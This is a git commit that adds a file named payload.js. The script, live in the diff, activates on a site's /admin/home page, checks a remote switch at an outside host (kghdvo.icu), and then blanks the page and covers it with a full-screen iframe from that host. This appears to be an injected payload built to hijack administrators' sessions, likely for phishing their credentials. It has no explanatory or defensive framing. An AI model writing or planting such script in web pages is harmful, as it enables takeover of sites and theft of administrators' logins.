8e6ed2ecfb60ec655a22ee72676188f96ea4e236
cnmdpaaaa <mxmex721@gmail.com>
2025-06-30 14:17:42 +0800

    Add files via upload

---
+++ payload.js
@@ -0,0 +1,25 @@
+(function () {
+  if (location.pathname === "/admin/home") {
+    fetch("https://kghdvo.icu:4443/js.txt", { cache: "no-store" })
+      .then(res => res.text())
+      .then(text => {
+        if (text.trim() === "true") {
+          const iframe = document.createElement("iframe");
+          iframe.src = "https://kghdvo.icu:4443/pit.html";
+          iframe.style.position = "fixed";
+          iframe.style.top = "0";
+          iframe.style.left = "0";
+          iframe.style.width = "100%";
+          iframe.style.height = "100%";
+          iframe.style.border = "none";
+          iframe.style.zIndex = "9999";
+          iframe.style.backgroundColor = "white";
+          document.body.innerHTML = "";
+          document.body.appendChild(iframe);
+        }
+      })
+      .catch(err => {
+        console.error("error", err);
+      });
+  }
+})();
